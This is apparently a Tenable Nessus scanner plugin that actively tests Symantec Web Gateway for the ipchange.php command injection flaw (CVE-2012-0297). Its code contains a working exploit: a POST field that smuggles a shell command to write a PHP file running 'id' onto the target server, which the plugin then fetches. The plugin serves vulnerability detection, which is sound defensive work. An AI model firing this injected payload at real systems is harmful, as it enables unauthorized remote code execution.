#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(59208);
  script_version("1.31");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_cve_id("CVE-2012-0297");
  script_bugtraq_id(53444);
  script_xref(name:"TRA", value:"TRA-2012-03");
  script_xref(name:"EDB-ID", value:"19065");

  script_name(english:"Symantec Web Gateway ipchange.php Shell Command Injection (SYM12-006) (intrusive check)");
  script_summary(english:"Uploads and executes a PHP script");

  script_set_attribute(attribute:"synopsis", value:
"A web security application hosted on the remote web server has a
command injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is hosting a version of Symantec Web Gateway
that is affected by a shell command injection vulnerability.  The
ipchange.php script calls the exec() function with user-controlled
input that is not properly sanitized.  A remote, unauthenticated
attacker could exploit this to execute arbitrary shell commands as
the apache user.  After exploitation, obtaining a root shell is
trivial.");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2012-03");
  script_set_attribute(attribute:"see_also", value:"https://www.zerodayinitiative.com/advisories/ZDI-12-090/");
  # https://support.symantec.com/en_US/article.SYMSA1250.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5b5929ae");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Symantec Web Gateway version 5.0.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Symantec Web Gateway 5.0.2 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Symantec Web Gateway 5.0.2.8 relfile File Inclusion Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:symantec:web_gateway");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("symantec_web_gateway_detect.nasl");
  script_require_keys("www/symantec_web_gateway");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:443, php:TRUE);
install = get_install_from_kb(appname:'symantec_web_gateway', port:port, exit_on_fail:TRUE);

url = install['dir'] + '/ipchange.php';
filename = strcat('cleaner/', SCRIPT_NAME, '-', unixtime(), '.php');
cmd = 'echo "<? system("id"); ?>" > ' + filename;
postdata = 'ip=localhost%0d%0a&subnet="|' + cmd + '|"';
res = http_send_recv3(
  method:'POST',
  port:port,
  item:url,
  content_type:'application/x-www-form-urlencoded',
  data:postdata,
  exit_on_fail:TRUE
);
script_creation = http_last_sent_request();

url = install['dir'] + '/' + filename;
res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);

if(!egrep(pattern:'uid=[0-9]+.*gid=[0-9]+.*', string:res[2]))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, 'Symantec Web Gateway', build_url(qs:install['dir'], port:port));

if (report_verbosity > 0)
{
  report =
    '\nNessus created a PHP file by sending the following request :\n\n' +
    crap(data:"-", length:30)+' Request '+ crap(data:"-", length:30)+'\n'+
    chomp(script_creation) + '\n' +
    crap(data:"-", length:30)+' Request '+ crap(data:"-", length:30)+'\n'+
    '\nThis file executes the "id" command and is located at :\n\n' +
    build_url(qs:url, port:port) + '\n';

  if (report_verbosity > 1)
    report += '\nRequesting this file returned the following output :\n\n' + 
      data_protection::sanitize_uid(output:chomp(res[2])) + '\n';

  security_hole(port:port, extra:report);
}
else security_hole(port);
